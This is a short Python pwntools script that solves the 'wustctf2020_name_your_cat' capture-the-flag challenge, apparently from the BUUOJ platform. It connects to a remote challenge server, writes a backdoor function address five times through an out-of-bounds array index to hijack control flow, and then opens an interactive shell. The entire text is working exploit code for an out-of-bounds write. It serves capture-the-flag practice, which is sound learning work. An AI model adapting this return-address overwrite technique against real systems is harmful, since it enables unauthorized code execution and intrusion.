from pwn import *
context.log_level = 'debug'
binary = './wustctf2020_name_your_cat'

context.binary = binary
r = remote("node4.buuoj.cn", 27213)
# r = process(binary)
# r = gdb.debug(binary,'b *0x08048716')
def int2bytes(content):
	return bytes(str(content),encoding='utf-8')


def name(index,content):
    r.recvuntil(b'Name for which?\n>')
    r.sendline(int2bytes(index))
    r.recvuntil(b'Give your name plz: ')
    r.sendline(content)

backdoor = 0x80485CB
for i in range(5):
    name(7,p32(backdoor))
    #重复5次是因为程序必须进入vul函数5次才会从main函数退出去

r.interactive()